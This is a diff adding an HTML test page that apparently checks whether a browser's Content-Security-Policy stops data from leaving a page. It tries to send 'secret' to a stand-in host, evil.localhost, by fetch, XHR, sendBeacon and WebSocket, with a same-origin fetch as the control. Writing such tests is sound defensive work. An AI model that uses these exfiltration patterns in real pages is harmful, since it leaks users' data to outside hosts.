@@ -1,0 +1,24 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><script src="/_lib.js"></script></head><body>
+<script>
+  var r = {};
+  fetch('http://evil.localhost:6100/fetch').then(function () { r.fetch = 'resolved'; }, function (e) { r.fetch = errName(e); });
+  fetch('http://evil.localhost:6100/fetch-no-cors', { mode: 'no-cors' }).then(function () { r.fetchNoCors = 'resolved'; }, function (e) { r.fetchNoCors = errName(e); });
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', 'http://evil.localhost:6100/xhr');
+    x.onload = function () { r.xhr = 'loaded'; };
+    x.onerror = function () { r.xhr = 'error'; };
+    x.send('secret');
+  } catch (e) { r.xhr = errName(e); }
+  try { r.beacon = navigator.sendBeacon('http://evil.localhost:6100/beacon', 'secret'); } catch (e) { r.beacon = errName(e); }
+  try {
+    var ws = new WebSocket('ws://evil.localhost:6100/ws');
+    ws.onopen = function () { r.ws = 'open'; };
+    ws.onerror = function () { r.ws = r.ws || 'error'; };
+  } catch (e) { r.ws = errName(e); }
+  // 對照組：同一個 bundle 內的 JSON 必須可以讀（connect-src 'self' + ACAO *）
+  fetch('/data.json').then(function (res) { return res.json(); }).then(function (j) { r.selfFetch = j.ok === true ? 'ok' : 'bad'; }, function (e) { r.selfFetch = errName(e); });
+  setTimeout(function () { report('result', r); report('done'); }, 1500);
+</script>
+</body></html>
